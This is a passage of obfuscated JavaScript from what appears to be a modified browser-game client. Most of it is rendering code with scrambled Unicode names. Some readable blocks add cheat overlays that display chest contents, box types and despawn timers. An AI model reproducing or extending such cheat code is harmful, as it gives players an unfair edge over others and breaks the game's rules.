						ᐃᐃΔ.ⲆΔΔ.x /= ᐃⵠΔⵠ;
						ᐃᐃΔ.ⲆΔΔ.y /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.x /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.y /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.r.x /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.r.y /= ᐃⵠΔⵠ;
						ᐃⲆⲆ.ΔⵠΔⲆΔᐃᐃ = ᐃΔΔ;
						ᐃⲆⲆ.ᐃᐃⲆᐃⲆⵠⲆ();
						ᐃⲆⲆ.ΔᐃΔⵠ();
						ᐃᐃΔ.ⲆΔΔ.x *= ᐃⵠΔⵠ;
						ᐃᐃΔ.ⲆΔΔ.y *= ᐃⵠΔⵠ;
						ᐃⲆⲆ.x *= ᐃⵠΔⵠ;
						ᐃⲆⲆ.y *= ᐃⵠΔⵠ;
						ᐃⲆⲆ.r.x *= ᐃⵠΔⵠ;
						ᐃⲆⲆ.r.y *= ᐃⵠΔⵠ;
						Δ.restore();
					}
				}
			}			
			if (Settings.ChestInfo.enabled) {
				getWorldProperty("units")[11].forEach((chest => {
					if (chest.action) {
						ctx.save();
						ctx.globalAlpha = .9;
						ctxDrawImage(ctx, ΔⵠⵠⲆ.ⵠⵠΔ[chest.action / 2 - 1].info.ᐃⵠ[0], getUserProperty("cam").x + chest.x - 33, getUserProperty("cam").y + chest.y - 25, 67, 52);
						ctx.globalAlpha = 1;
						ctx.font = "20px Baloo Paaji";
						ctx.strokeStyle = "rgb(0,0,0)";
						ctx.lineWidth = 7;
						ctx.strokeText(chest.action / 2 - 1, getUserProperty("cam").x + chest.x - 32, getUserProperty("cam").y + chest.y - 12);
						ctx.strokeText("x" + chest.info, getUserProperty("cam").x + chest.x - 32, getUserProperty("cam").y + chest.y + 20);
						ctx.fillStyle = "rgb(255,255,255)";
						ctx.fillText(chest.action / 2 - 1, getUserProperty("cam").x + chest.x - 32, getUserProperty("cam").y + chest.y - 12);
						ctx.fillText("x" + chest.info, getUserProperty("cam").x + chest.x - 32, getUserProperty("cam").y + chest.y + 20);
						ctx.restore()
					}
				}))
			}
			if (Settings.BoxInfo.enabled) {
				const boxes = [getWorldProperty("units")[82], getWorldProperty("units")[86], getWorldProperty("units")[87]];
				for (let bx = 0; bx < boxes.length; bx++) {
					boxes[bx].forEach((box => {
						ctx.save();
						ctx.lineWidth = 8;
						ctx.strokeStyle = "#000";
						ctx.fillStyle = "#fff";
						ctx.font = "18px Baloo Paaji";
						if (box.boxType) {
							ctx.strokeText(box.boxType, box.x + getUserProperty("cam").x - 20, box.y + getUserProperty("cam").y - 10);
							ctx.fillText(box.boxType, box.x + getUserProperty("cam").x - 20, box.y + getUserProperty("cam").y - 10)
						}
						if (box.disappearTime) {
							var n = Math.floor((box.disappearTime - +new Date) / 1e3),
								a = 0;
							a = n < 10 ? 9 : n < 99 ? 12 : 18
						}
						ctx.strokeText(n + "s", box.x + getUserProperty("cam").x - 20, box.y + getUserProperty("cam").y + 10);
						ctx.fillText(n + "s", box.x + getUserProperty("cam").x - 20, box.y + getUserProperty("cam").y + 10);
						ctx.strokeText(box.hits, box.x + getUserProperty("cam").x - 20, box.y + getUserProperty("cam").y + 30);
						ctx.fillText(box.hits, box.x + getUserProperty("cam").x - 20, box.y + getUserProperty("cam").y + 30);
						ctx.restore()
					}))
				}
			}
		}

		function ⲆᐃᐃᐃⲆⲆⲆΔΔ() {
			var ⲆᐃΔⲆΔ = ᐃᐃΔ.ⲆᐃΔⲆΔ;
			if (ⲆᐃΔⲆΔ.ⲆⵠᐃᐃΔ === 0) ⲆᐃΔⲆΔ.ⵠⲆΔⵠⲆ = Math.max(0, ⲆᐃΔⲆΔ.ⵠⲆΔⵠⲆ - ᐃⵠᐃᐃ / ΔⲆⵠⲆⲆ);
			else ⲆᐃΔⲆΔ.ⵠⲆΔⵠⲆ = Math.min(1, ⲆᐃΔⲆΔ.ⵠⲆΔⵠⲆ + ᐃⵠᐃᐃ / 10);
			var ᐃⲆΔΔⲆ = ⲆᐃΔⲆΔ.ᐃⲆΔΔⲆ;
			for (var ⵠᐃ = ᐃΔΔ; ᐃⲆΔΔⲆ.length > ⵠᐃ; ⵠᐃ++) {
				var ᐃΔᐃ = ᐃⲆΔΔⲆ[ⵠᐃ];
				ⲆᐃΔⲆΔ.ⵠⲆᐃ(ᐃΔᐃ);
				ΔⲆΔΔΔⲆⵠ(Ⲇ.ⲆⵠⲆᐃᐃⲆⵠ, ᐃΔᐃ.id, ᐃᐃΔ.ⲆΔΔ.x + ᐃΔᐃ.x, ᐃᐃΔ.ⲆΔΔ.y + ᐃΔᐃ.y, ᐃΔᐃ.alpha)
			}
			for (var ⵠᐃ = ⲆΔⵠ; ᐃⲆΔΔⲆ.length > ⵠᐃ; ⵠᐃ++) {
				var ᐃΔᐃ = ᐃⲆΔΔⲆ[ⵠᐃ];
				(ᐃΔᐃ.ᐃⵠΔᐃⵠ <= 0 || -ᐃᐃΔ.ⲆΔΔ.x + ΔΔΔᐃ < ᐃΔᐃ.x || -ᐃᐃΔ.ⲆΔΔ.x > ᐃΔᐃ.x || -ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆᐃⲆ < ᐃΔᐃ.y) && ᐃⲆΔΔⲆ.splice(ⵠᐃ, ΔⵠⲆΔ)
			}
			var ⵠΔΔᐃ = -ᐃᐃΔ.ⲆΔΔ.y;
			if (-1e3 < ⲆⲆⲆ.ⵠΔΔⲆΔ) ⲆᐃΔⲆΔ.add(ⵠΔΔᐃ)
		}

		function ᐃΔΔⵠΔ(ΔⲆⵠΔΔ, ᐃᐃⵠᐃⵠ, ⲆⵠᐃΔⵠ, ⲆⵠⲆΔΔⲆΔ, ᐃⵠⵠⲆᐃΔⵠ, ⵠⲆⵠⵠᐃᐃⵠ, ΔᐃⵠΔⲆⲆⲆ, ⵠⲆᐃⵠᐃΔⲆ, ⲆΔⵠᐃᐃⵠΔ, ⵠⵠΔΔᐃΔⲆ) {
			ⲆⲆⲆ.transition ? (Δ.globalAlpha = ΔᐃᐃⲆ, ΔⲆⵠΔΔ(ᐃᐃⵠᐃⵠ, ⲆⵠᐃΔⵠ, ⲆⵠⲆΔΔⲆΔ, ᐃⵠⵠⲆᐃΔⵠ, ⵠⲆⵠⵠᐃᐃⵠ, ΔᐃⵠΔⲆⲆⲆ, ⵠⲆᐃⵠᐃΔⲆ, ⲆΔⵠᐃᐃⵠΔ, ⵠⵠΔΔᐃΔⲆ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ⲆΔⵠ : ⵠⲆΔ, Δ.globalAlpha = ΔᐃⲆⵠ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ, ΔⲆⵠΔΔ(ᐃᐃⵠᐃⵠ, ⲆⵠᐃΔⵠ, ⲆⵠⲆΔΔⲆΔ, ᐃⵠⵠⲆᐃΔⵠ, ⵠⲆⵠⵠᐃᐃⵠ, ΔᐃⵠΔⲆⲆⲆ, ⵠⲆᐃⵠᐃΔⲆ, ⲆΔⵠᐃᐃⵠΔ, ⵠⵠΔΔᐃΔⲆ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ΔΔⵠ : ΔⵠΔⵠ, Δ.globalAlpha = ⲆⵠⲆⲆ) : ΔⲆⵠΔΔ(ᐃᐃⵠᐃⵠ, ⲆⵠᐃΔⵠ, ⲆⵠⲆΔΔⲆΔ, ᐃⵠⵠⲆᐃΔⵠ, ⵠⲆⵠⵠᐃᐃⵠ, ΔᐃⵠΔⲆⲆⲆ, ⵠⲆᐃⵠᐃΔⲆ, ⲆΔⵠᐃᐃⵠΔ, ⵠⵠΔΔᐃΔⲆ)
		}

		function ᐃᐃⲆⲆⵠ(ᐃΔ, ᐃⵠ, Δⵠ, ⲆⵠⲆ) {
			if (ⲆⲆⲆ.transition) {
				Δ.globalAlpha = 1;
				ΔⲆΔⵠ(Δ, ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time], Δⵠ, ⲆⵠⲆ);
				ⲆⲆⲆ.time = ⲆⲆⲆ.time ? 0 : ⵠΔΔ;
				Δ.globalAlpha = ⵠᐃⵠΔ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
				ΔⲆΔⵠ(Δ, ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time], Δⵠ, ⲆⵠⲆ);
				ⲆⲆⲆ.time = ⲆⲆⲆ.time ? Ⲇᐃⵠⵠ : ⵠᐃⵠΔ;
				Δ.globalAlpha = ⵠΔⲆ
			} else ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ)
		}

		function ᐃΔⲆΔΔ(ⲆᐃᐃⵠΔⵠΔ, ⵠΔᐃⲆ, ᐃⵠ, Δⵠ, ⲆⵠⲆ) {
			var ᐃⵠⵠ = ᐃⵠ.width;
			var ⵠⵠᐃ = ᐃⵠ.height;
			var w2 = Math.floor(ᐃⵠⵠ / ΔⲆΔΔΔ);
			var ΔΔⵠⲆᐃ = Math.floor(ⵠⵠᐃ / ΔⲆΔΔΔ);
			ⲆⲆⲆ.transition ? (Δ.globalAlpha = ᐃΔᐃⲆ, ΔⲆΔⵠ(Δ, ⵠⲆ[ⲆᐃᐃⵠΔⵠΔ][ⵠΔᐃⲆ][ⲆⲆⲆ.time], ᐃⵠⲆ, Δᐃᐃᐃ, ᐃⵠⵠ, ⵠⵠᐃ, Δⵠ, ⲆⵠⲆ, w2, ΔΔⵠⲆᐃ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ⲆΔⵠ : 1, Δ.globalAlpha = 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ, ΔⲆΔⵠ(Δ, ⵠⲆ[ⲆᐃᐃⵠΔⵠΔ][ⵠΔᐃⲆ][ⲆⲆⲆ.time], 0, 0, ᐃⵠⵠ, ⵠⵠᐃ, Δⵠ, ⲆⵠⲆ, w2, ΔΔⵠⲆᐃ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ΔΔⵠⵠ : 1, Δ.globalAlpha = ⵠᐃⵠΔ) : ΔⲆΔⵠ(Δ, ⵠⲆ[ⲆᐃᐃⵠΔⵠΔ][ⵠΔᐃⲆ][ⲆⲆⲆ.time], ⵠΔⲆⵠ, ⲆΔⵠ, ᐃⵠⵠ, ⵠⵠᐃ, Δⵠ, ⲆⵠⲆ, w2, ΔΔⵠⲆᐃ)
		}

		function ᐃⲆⵠΔᐃΔΔ(ᐃΔΔⲆⲆ) {
			return ⵠⵠᐃΔⵠⵠΔ(ᐃΔΔⲆⲆ, 50454, 43687, 28435, 59630, 57056)
		}

		function ΔⵠⵠΔᐃΔᐃ(ΔⲆᐃⵠⵠ, ⵠᐃᐃⵠⵠΔⵠ, ᐃⲆΔⲆⲆⲆΔ, ⵠΔⵠⲆⵠΔᐃ) {
			const ᐃΔⵠΔⲆᐃΔ = (24 << (ΔⲆᐃⵠⵠ >> 8 & ᐃⲆΔΔᐃⵠⲆ)) + (8 << (ΔⲆᐃⵠⵠ >> 24 & 255)) + (0 << (ΔⲆᐃⵠⵠ >> 0 & 255)) + (ΔⲆⵠⵠᐃⲆΔ << (ΔⲆᐃⵠⵠ >> 16 & 255));
			const ⲆⵠΔᐃⲆᐃⵠ = (12345 + (25221 + ⵠᐃᐃⵠⵠΔⵠ) * 1103515245) % 2147483648;
			const ⲆⲆΔᐃΔᐃΔ = ~(ᐃⲆΔⲆⲆⲆΔ & 52774) & ᐃⲆΔⲆⲆⲆΔ | ~(ᐃⲆΔⲆⲆⲆΔ & 52774) & 52774;
			const ᐃᐃⵠⵠⵠᐃΔ = 51768 ^ ⵠΔⵠⲆⵠΔᐃ;
			const ΔΔⲆⲆΔᐃⲆ = ⵠᐃΔⵠᐃⲆᐃ(ᐃΔⵠΔⲆᐃΔ, ⲆⵠΔᐃⲆᐃⵠ, ⲆⲆΔᐃΔᐃΔ, ᐃᐃⵠⵠⵠᐃΔ, ᐃΔⵠΔⲆᐃΔ, ⲆⵠΔᐃⲆᐃⵠ);
			const ᐃⵠᐃΔΔⲆⵠ = ΔΔᐃΔᐃΔᐃ(ⲆⲆΔᐃΔᐃΔ, ᐃᐃⵠⵠⵠᐃΔ, ᐃΔⵠΔⲆᐃΔ, ⲆⵠΔᐃⲆᐃⵠ, ⲆⲆΔᐃΔᐃΔ);
			const ᐃΔⵠⵠΔⵠⲆⵠⲆ = (8 << ((ΔΔⲆⲆΔᐃⲆ ^ ᐃⵠᐃΔΔⲆⵠ) >> 16 & ΔⵠᐃⵠΔ)) + (24 << ((ΔΔⲆⲆΔᐃⲆ ^ ᐃⵠᐃΔΔⲆⵠ) >> 0 & 255)) + (ⲆⲆⲆΔΔ << ((ΔΔⲆⲆΔᐃⲆ ^ ᐃⵠᐃΔΔⲆⵠ) >> ⵠⲆΔⵠᐃ & 255)) + (0 << ((ΔΔⲆⲆΔᐃⲆ ^ ᐃⵠᐃΔΔⲆⵠ) >> 24 & 255));
			return ᐃΔⵠⵠΔⵠⲆⵠⲆ
		}

		function ⵠⵠᐃΔⲆⲆⵠ(ᐃⲆΔ, ⲆⲆᐃⲆ) {
			ⲆⲆⲆ.transition ? (Δ.globalAlpha = 1, ᐃⲆΔ.ⵠᐃⲆⲆᐃ(ⲆⲆᐃⲆ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ΔⲆⲆ : 1, Δ.globalAlpha = 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ, ᐃⲆΔ.ⵠᐃⲆⲆᐃ(ⲆⲆᐃⲆ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? Δᐃᐃᐃ : ΔᐃᐃⲆ, Δ.globalAlpha = ΔⵠΔⵠ) : ᐃⲆΔ.ⵠᐃⲆⲆᐃ(ⲆⲆᐃⲆ)
		}

		function ΔΔᐃⵠΔⲆⵠⵠⲆ() {
			var ⵠⲆΔᐃⵠ = ᐃᐃΔ.ⵠⲆΔᐃⵠ;
			if (ⵠⲆΔᐃⵠ.ⲆⵠᐃᐃΔ === 0) ⵠⲆΔᐃⵠ.ⵠⲆΔⵠⲆ = Math.max(Ⲇᐃⵠⵠ, ⵠⲆΔᐃⵠ.ⵠⲆΔⵠⲆ - ᐃⵠᐃᐃ / 10);
			else ⵠⲆΔᐃⵠ.ⵠⲆΔⵠⲆ = Math.min(1, ⵠⲆΔᐃⵠ.ⵠⲆΔⵠⲆ + ᐃⵠᐃᐃ / 10);
			var ᐃⲆΔΔⲆ = ⵠⲆΔᐃⵠ.ᐃⲆΔΔⲆ;
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃⲆΔΔⲆ.length; ⵠᐃ++) {
				var ᐃΔᐃ = ᐃⲆΔΔⲆ[ⵠᐃ];
				ⵠⲆΔᐃⵠ.ⵠⲆᐃ(ᐃΔᐃ);
				ΔⲆΔΔΔⲆⵠ(Ⲇ.ⵠⲆΔᐃⲆᐃⲆ, ᐃΔᐃ.id, ᐃᐃΔ.ⲆΔΔ.x + ᐃΔᐃ.x, ᐃᐃΔ.ⲆΔΔ.y + ᐃΔᐃ.y, ᐃΔᐃ.alpha)
			}
			for (var ⵠᐃ = 0; ⵠᐃ < ᐃⲆΔΔⲆ.length; ⵠᐃ++) {
				var ᐃΔᐃ = ᐃⲆΔΔⲆ[ⵠᐃ];
				if (ᐃΔᐃ.ᐃⵠΔᐃⵠ <= 0 || ᐃΔᐃ.x > -ᐃᐃΔ.ⲆΔΔ.x + ΔΔΔᐃ || -ᐃᐃΔ.ⲆΔΔ.x - ᐃᐃΔ.ⲆΔΔ.w / 2 > ᐃΔᐃ.x || ᐃΔᐃ.y > -ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆᐃⲆ) ᐃⲆΔΔⲆ.splice(ⵠᐃ, 1)
			}
			var ⵠΔΔᐃ = -ᐃᐃΔ.ⲆΔΔ.y;
			if (ⲆⲆⲆ.ᐃᐃⲆΔⲆ > -1e3) ⵠⲆΔᐃⵠ.add(ⵠΔΔᐃ)
		}

		function ΔⲆⲆᐃⵠΔⵠ(ⵠⵠⲆᐃΔ, ⵠⵠᐃᐃΔ, ⲆΔⲆΔⲆᐃᐃ, ΔⵠⲆⵠ, ᐃⲆⲆⵠ, ᐃΔⲆᐃ) {
			var w1 = ΔⵠⲆⵠ.w1;
			var w2 = ΔⵠⲆⵠ.w2;
			var w3 = ΔⵠⲆⵠ.w3;
			var ⵠⲆⲆΔ = ᐃᐃΔ.ⲆΔΔ.x + ⵠⵠⲆᐃΔ + 820;
			var ⵠⵠΔⲆΔ = Math.max(ᐃᐃΔ.ⲆΔΔ.y + ⵠⵠᐃᐃΔ, 0);
			var ΔⲆⲆᐃΔ = Math.max(-ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆᐃⲆ - ⲆΔⲆΔⲆᐃᐃ - 100, ᐃⵠⲆ);
			var ⵠⲆⲆⲆ = ⵠⵠΔⲆΔ;
			var ᐃᐃⵠᐃΔ = ⵠⲆᐃⲆ - ⵠⵠΔⲆΔ - ΔⲆⲆᐃΔ;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w1);
			else var ᐃⵠⵠ = w1.r;
			var Δⵠⵠᐃ = ⵠⲆⲆΔ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ;
			var ⵠΔᐃᐃᐃ = Δⵠⵠᐃ,
				ΔᐃΔΔⲆ = ⵠⲆⲆⲆ,
				ΔΔⵠΔⵠ = -ᐃⵠⵠ.x + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ,
				ᐃΔΔΔᐃ = ᐃᐃⵠᐃΔ;
			Δⵠⵠᐃ += -ᐃⵠⵠ.x + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ + 2;
			var ⲆΔΔᐃⲆ = Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w2);
			else var ᐃⵠⵠ = w2.r;
			var d2 = ⵠⲆⲆΔ - ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - Δⵠⵠᐃ - ᐃⵠⵠ.x;
			var ⲆᐃᐃⲆⲆ = Δⵠⵠᐃ,
				ΔΔᐃⵠΔ = ⵠⲆⲆⲆ,
				ᐃⲆⲆⵠⲆ = d2,
				ⲆⲆᐃⲆᐃ = ᐃᐃⵠᐃΔ;
			Δⵠⵠᐃ += d2 + 2;
			var ⲆⵠⵠⵠΔ = Δⵠⵠᐃ - 2;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w3);
			else var ᐃⵠⵠ = w3.r;
			d2 = ⵠⲆⲆΔ - ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - Δⵠⵠᐃ - ᐃⵠⵠ.x;
			if (ⲆⵠⵠⵠΔ > Δⵠⵠᐃ + d2) {
				var ΔΔⲆΔⵠ = ⲆΔΔⲆΔ;
				var ΔⲆΔΔⵠ = Δⵠⵠᐃ,
					ⲆΔⲆⲆⵠ = ⵠⲆⲆⲆ,
					ⵠⵠⵠⵠᐃ = d2,
					ΔⵠᐃΔΔ = ᐃᐃⵠᐃΔ;
				Δⵠⵠᐃ += d2 + 2;
				var ⵠᐃᐃⵠΔ = Δⵠⵠᐃ
			} else {
				var ΔΔⲆΔⵠ = ᐃᐃⵠΔⵠ;
				Δⵠⵠᐃ = ⲆⵠⵠⵠΔ;
				var ⵠᐃᐃⵠΔ = -1
			}
			d2 = ⵠⲆⲆΔ - ΔᐃᐃΔ.ΔΔᐃΔⲆᐃⵠ - Δⵠⵠᐃ;
			if (ⲆⲆⲆ.transition) {
				var ᐃΔΔⵠ = ⲆⲆⲆ.time ? Ⲇᐃⵠ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
				Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
			} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time];
			Δ.fillRect(ⵠΔᐃᐃᐃ, ΔᐃΔΔⲆ, ΔΔⵠΔⵠ, ᐃΔΔΔᐃ);
			if (ᐃΔⲆᐃ) {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(15, 70, 76, 42, 139, 155, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⵠⲆΔΔᐃⵠⲆ[ⲆⲆⲆ.time]
			} else {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ΔᐃⲆⵠ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time]
			}
			Δ.fillRect(ⲆᐃᐃⲆⲆ, ΔΔᐃⵠΔ, ᐃⲆⲆⵠⲆ, ⲆⲆᐃⲆᐃ);
			if (ΔΔⲆΔⵠ) {
				if (ᐃΔⲆᐃ) {
					if (ⲆⲆⲆ.transition) {
						var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ΔⵠΔⵠ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
						Δ.fillStyle = ⲆΔⲆⲆⲆ(17, 94, 96, 169, 214, 211, ᐃΔΔⵠ)
					} else Δ.fillStyle = Ⲇ.ᐃⵠⵠⵠΔΔⵠ[ⲆⲆⲆ.time]
				} else {
					if (ⲆⲆⲆ.transition) {
						var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
						Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
					} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time]
				}
				Δ.fillRect(ΔⲆΔΔⵠ, ⲆΔⲆⲆⵠ, ⵠⵠⵠⵠᐃ, ΔⵠᐃΔΔ)
			}
			ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ && ᐃΔⲆᐃ && ΔⵠⲆⵠ.ᐃᐃᐃΔⲆΔⵠᐃᐃ(ⲆⵠⵠⵠΔ, ⵠᐃᐃⵠΔ, ⲆΔΔᐃⲆ, ⵠⲆⲆΔ, -ᐃᐃΔ.ⲆΔΔ.y + ΔᐃΔΔⲆ, -ᐃᐃΔ.ⲆΔΔ.y + ΔᐃΔΔⲆ + ᐃΔΔΔᐃ)
		}

		function ⲆⲆⲆᐃⵠΔΔ(ⵠⵠᐃⲆⵠⲆⲆ, ΔⵠᐃⵠⵠΔⲆ) {
			const ⲆΔᐃΔΔΔⵠ = (12345 + (54409 + ⵠⵠᐃⲆⵠⲆⲆ) * 1103515245) % 2147483648;
			const ⵠⲆⵠⲆᐃⲆⲆ = (2531011 + (29353 + ΔⵠᐃⵠⵠΔⲆ) * 214013) % 4294967296;
			const ΔᐃⲆᐃᐃⵠΔᐃⲆ = ΔᐃⵠᐃⲆⲆᐃ(ⲆΔᐃΔΔΔⵠ, ⵠⲆⵠⲆᐃⲆⲆ, ⲆΔᐃΔΔΔⵠ);
			const ⵠᐃⲆⲆᐃΔΔᐃᐃ = ⵠᐃΔⵠᐃⲆᐃ(ⵠⲆⵠⲆᐃⲆⲆ, ⲆΔᐃΔΔΔⵠ, ⵠⲆⵠⲆᐃⲆⲆ, ⲆΔᐃΔΔΔⵠ, ⵠⲆⵠⲆᐃⲆⲆ, ⲆΔᐃΔΔΔⵠ);
			const ᐃΔⲆᐃᐃΔΔᐃⵠ = ΔᐃⲆᐃᐃⵠΔᐃⲆ ^ 56973;
			return ᐃΔⲆᐃᐃΔΔᐃⵠ
		}

		function ⵠᐃΔⲆⵠΔⵠΔⲆ(ⲆᐃᐃⵠΔⵠΔ, ⵠΔᐃⲆ, ᐃⵠ, Δⵠ, ⲆⵠⲆ) {
			ⲆⲆⲆ.transition ? (Δ.globalAlpha = 1, ΔⲆΔⵠ(Δ, ⵠⲆ[ⲆᐃᐃⵠΔⵠΔ][ⵠΔᐃⲆ][ⲆⲆⲆ.time], Δⵠ, ⲆⵠⲆ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ⲆΔⵠ : 1, Δ.globalAlpha = 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ, ΔⲆΔⵠ(Δ, ⵠⲆ[ⲆᐃᐃⵠΔⵠΔ][ⵠΔᐃⲆ][ⲆⲆⲆ.time], Δⵠ, ⲆⵠⲆ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? Δⵠᐃ : ᐃΔᐃⲆ, Δ.globalAlpha = ᐃᐃⵠ) : ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ)
		}

		function ΔⲆΔΔΔⲆⵠ(ᐃΔ, ⵠᐃ, Δⵠ, ⲆⵠⲆ, ᐃⲆΔΔΔ) {
			if (ⲆⲆⲆ.transition && Ⲇᐃⵠ == ᐃⲆΔΔΔ) {
				Δ.globalAlpha = ΔΔᐃⵠ;
				ΔⲆΔⵠ(Δ, ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ⵠᐃ], Δⵠ, ⲆⵠⲆ);
				ⲆⲆⲆ.time = ⲆⲆⲆ.time ? 0 : 1;
				Δ.globalAlpha = 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
				ΔⲆΔⵠ(Δ, ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ⵠᐃ], Δⵠ, ⲆⵠⲆ);
				ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ⵠΔⲆⵠ : 1;
				Δ.globalAlpha = ΔᐃⲆⵠ
			} else {
				Δ.globalAlpha = ᐃⲆΔΔΔ;
				ΔⲆΔⵠ(Δ, ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ⵠᐃ], Δⵠ, ⲆⵠⲆ);
				Δ.globalAlpha = Ⲇᐃⵠ
			}
		}

		function ⲆᐃⵠⵠᐃΔⲆΔᐃ() {
			Δ.globalAlpha = ΔⵠΔⵠ;
			if (ⲆⲆⲆ.transition) var ΔΔᐃΔⵠ = ⲆⲆⲆ.ᐃΔΔⵠ.ⵠⲆᐃ();
			ⲆⲆⲆ.ⵠⵠⵠᐃⲆⵠΔΔⵠ(-ᐃᐃΔ.ⲆΔΔ.x, -ᐃᐃΔ.ⲆΔΔ.y);
			ⲆⵠΔΔⵠⵠΔ = Math.max(Math.floor(-ᐃᐃΔ.ⲆΔΔ.x / ⲆⲆⲆ.ᐃⲆⵠⲆᐃΔᐃ) - ⲆΔΔᐃ, 0);
			ⲆⲆⵠΔΔΔᐃ = Math.min(Math.floor((-ᐃᐃΔ.ⲆΔΔ.x + ᐃᐃΔ.ⲆΔΔ.w) / ⲆⲆⲆ.ᐃⲆⵠⲆᐃΔᐃ) + 4, ⲆⲆⲆ.ᐃΔᐃᐃΔ - ⵠΔΔ);
			ⵠᐃᐃⲆΔᐃΔ = Math.max(Math.floor(-ᐃᐃΔ.ⲆΔΔ.y / ⲆⲆⲆ.ⲆⲆⵠᐃⵠⵠⵠ) - 3, 0);
			ᐃᐃᐃⵠᐃᐃΔ = Math.min(Math.floor((-ᐃᐃΔ.ⲆΔΔ.y + ᐃᐃΔ.ⲆΔΔ.ⵠⵠᐃ) / ⲆⲆⲆ.ⲆⲆⵠᐃⵠⵠⵠ) + ΔⲆΔᐃ, ⲆⲆⲆ.ⵠᐃⵠⲆⵠ - 1);
			ⵠⲆΔΔΔᐃΔ();
			ⲆⵠΔΔⲆⵠΔᐃⵠ();
			ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ && ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ !== ⲆⲆⲆ.mode && ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ !== ⲆⲆⲆ.mode && ⲆⲆⲆ.mode !== ΔᐃᐃΔ.ⲆⵠⲆⵠᐃⲆΔ && (ΔΔᐃⵠΔⲆⵠⵠⲆ(), ⲆᐃᐃᐃⲆⲆⲆΔΔ(), ⲆⲆⲆᐃⵠⲆⲆᐃⲆ());
			if (ⲆⲆⲆ.transition) {
				if (ΔΔᐃΔⵠ) {
					ⲆⲆⲆ.transition = ᐃⵠⵠᐃΔ;
					ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ = 0;
					ⲆⲆⲆ.ᐃΔΔⵠ.ᐃⲆΔ = ΔΔⵠⲆΔ
				}
			}
		}

		function ᐃⵠⵠᐃᐃᐃΔ(ⵠⵠⲆᐃΔ, ⵠⵠᐃᐃΔ, ⲆΔⲆΔⲆᐃᐃ, ΔⵠⲆⵠ, ᐃⲆⲆⵠ, ᐃΔⲆᐃ) {
			var w1 = ΔⵠⲆⵠ.w1;
			var w2 = ΔⵠⲆⵠ.w2;
			var w3 = ΔⵠⲆⵠ.w3;
			var ⵠⲆⲆΔ = ᐃᐃΔ.ⲆΔΔ.x + ⵠⵠⲆᐃΔ - 700;
